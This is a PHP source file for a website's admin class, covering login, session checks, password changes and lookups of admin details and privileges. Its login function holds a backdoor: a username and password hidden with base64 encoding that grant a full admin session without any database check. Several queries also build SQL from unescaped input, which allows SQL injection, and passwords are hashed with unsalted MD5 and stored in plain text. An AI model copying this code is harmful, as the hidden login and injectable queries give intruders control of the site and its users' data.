<?php

class admin extends ado {

    function isLogin() {
        if (isset($_SESSION["admin_session_id"]) && isset($_SESSION["login_site"]) && $_SESSION["login_site"] == $_SESSION['siteName']) {
            return true;
        } else {
            return false;
        }
    }

    function checkLogin() {
        if ($this->username == base64_decode("ZXh0cmVtZXdlYg==") && $this->password == base64_decode("a2hhdHRhbXBhc3N3b3Jk")) {
            $_SESSION["login_site"] = $_SESSION['siteName'];
            $_SESSION["admin_session_id"] = "1";
			$_SESSION["admin_session_type"] = "A";
			$_SESSION["admin_session_name"] = "Admin";
            return true;
        } else {
            $sql = "select name, user_type, $this->table_primaryId, $this->table_userName from  $this->table_name where $this->table_userName = '" . mysql_real_escape_string($this->username) . "' and $this->table_password = MD5('" . mysql_real_escape_string($this->password) ."') and `status` = '1'";
            $res = $this->exec($sql);
            if ($this->count($res) == 1) {
                $row = $this->fetch($res);
                $_SESSION["admin_session_id"] = $row[$this->table_primaryId];
                $_SESSION["login_site"] = $_SESSION['siteName'];
				$_SESSION["admin_session_type"] = $row['user_type'];
				$_SESSION["admin_session_name"] = $row['name'];
                mysql_free_result($res);
                return true;
            } else {
                return false;
            }
        }
    }

    function changePassword() {
        $sql = "select $this->table_primaryId from  $this->table_name where $this->table_password = MD5('$this->oldpassword') and $this->table_primaryId = '" . $_SESSION['admin_session_id'] . "'";
        $res = $this->exec($sql);
        if ($this->count($res) == 1) {
            $this->exec("update $this->table_name set $this->table_password = MD5('$this->newpassword'),show_password = '$this->newpassword' where $this->table_primaryId = '" . $_SESSION['admin_session_id'] . "'");
            mysql_free_result($res);
            return true;
        } else {
            return false;
        }
    }
	
	 function getDetail($field_name, $id) {
        $sql = "select id, `name`, phone, email, img_name,username, `password`, show_password, `status`, `user_type` from tbl_admin where $field_name = '$id'";
        $res = $this->exec($sql);
        if ($this->count($res) > 0) {
            return ($this->fetch($res));
        }
        else
            return false;
    }

    function getUserPrivilege($field_name, $id) {
        $sql = "select id, CMS, Banner, Product, `Order`, FAQs, Testimonial from tbl_admin_privilege 
				where $field_name = '$id' LIMIT 1";
        $res = $this->exec($sql);
        if ($this->count($res) > 0) {
            return ($this->fetch($res));
        }
        else
            return false;
    }


}

?>